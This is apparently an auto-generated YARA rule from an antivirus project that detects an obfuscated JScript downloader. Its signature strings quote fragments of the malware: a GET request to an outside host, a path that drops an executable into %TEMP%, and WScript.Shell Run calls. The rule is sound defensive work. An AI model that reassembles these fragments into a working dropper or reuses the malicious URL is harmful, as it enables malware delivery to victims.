rule sig_20160328_fa2502ee90e389837ceef6816d64b63e {
  meta:
    description = "datamaliciousorder - file 20160328_fa2502ee90e389837ceef6816d64b63e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "65d99019f03850ee8bcd9aeb3d5c3715ef4892be3e99efebbe6dfc7e8e4a3302"

  strings:
    $s1  = "Kcqxjsw[Pthyu](\"GET\", \"http://mediaheadllc.com/k9ospw1\", false);" fullword ascii
    $s2  = "function Lxjastmfgp() {return Ypyenkmze[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZwfOKvrz.exe\";};" fullword ascii
    $s3  = "do {WScript[Lzahcp](Hdfmqeiqor() * 11)} while (Kcqxjsw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Lsvtos(Ztxsai, Qldcm){return Ztxsai - Qldcm;};" fullword ascii
    $s5  = "var Ypyenkmze = function Aqwpzhvv() {return WScript[Gfmxlqko](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Skmkoag() {return ((Dvzfjusrw == true) && (Dvzfjusrw == Ehgbhp)) ? 1 : Dflxfi;};" fullword ascii
    $s7  = "function Gtmnlh(Romidet){Ypyenkmze[\"Run\"](Romidet, Dflxfi, Dflxfi);};" fullword ascii
    $s8  = "var Lqqortsox = false;" fullword ascii
    $s9  = "var Ltdnj = new this[\"Date\"]();" fullword ascii
    $s10 = "function Hdfmqeiqor(){return 22;};" fullword ascii
    $s11 = "Dvzfjusrw = true; " fullword ascii
    $s12 = "function Lbppgdnss(){return Jecbpauafh;};" fullword ascii
    $s13 = "function Gxxikpjwez(Dnhhrza) {var Uxooskjtgl = (1, 2, 3, 4, 5, Dnhhrza); return Uxooskjtgl;};" fullword ascii
    $s14 = "return Lsvtos(Kepjxfyggx, Haiaecnva);" fullword ascii
    $s15 = "Ehgbhp = true; " fullword ascii
    $s16 = "var Dvzfjusrw = false;" fullword ascii
    $s17 = "function Fxssdzbw()" fullword ascii
    $s18 = "var Ehgbhp = false;" fullword ascii
    $s19 = "function Zsytq(){return Gfmxlqko;};" fullword ascii
    $s20 = "} catch(Uiusgrksli){Whxginrhca = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}